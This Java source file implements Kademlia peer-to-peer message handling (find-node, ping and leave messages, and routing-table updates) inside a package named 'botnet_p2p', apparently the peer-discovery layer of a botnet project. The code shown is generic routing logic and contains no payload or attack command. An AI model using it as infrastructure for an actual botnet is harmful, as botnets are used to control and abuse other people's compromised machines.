package botnet_p2p.business_logic_layer;

import botnet_p2p.model.KademliaPeer;
import botnet_p2p.p2p_layer.P2pLayer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.List;

import static botnet_p2p.MessageOuterClass.Message;


class MessageHandler {
    private static final Logger logger = LogManager.getLogger(MessageHandler.class);

    private P2pLayer p2pLayer;
    private KademliaPeer me;

    public MessageHandler(P2pLayer p2pLayer, KademliaPeer me) {
        this.p2pLayer = p2pLayer;
        this.me = me;
    }

    void handleFindNode(Message message) {
        KademliaPeer sender = KademliaPeer.fromContact(message.getSender());

        // respond with nearest nodes list
        List<KademliaPeer> nearestPeers = this.p2pLayer.getNearestPeers(
                message.getFindNode().getGuid()
        );
        p2pLayer.foundNodes(sender, me, nearestPeers);
        addToRoutingTable(sender);
    }

    void handleLeaveMessage(Message message) {
        KademliaPeer sender = KademliaPeer.fromContact(message.getSender());

        // remove from routing table
        p2pLayer.removeFromRoutingTable(sender);
        logger.info(sender.getGuid() + " said goodbye");
    }

    void handlePingMessage(Message message) {
        KademliaPeer sender = KademliaPeer.fromContact(message.getSender());

        // respond
        p2pLayer.pingResponse(sender, me);
        addToRoutingTable(sender);
    }

    void addToRoutingTable(KademliaPeer sender) {
        // add sender to routing table
        this.p2pLayer.addToRoutingTable(
                sender
        );
    }
}
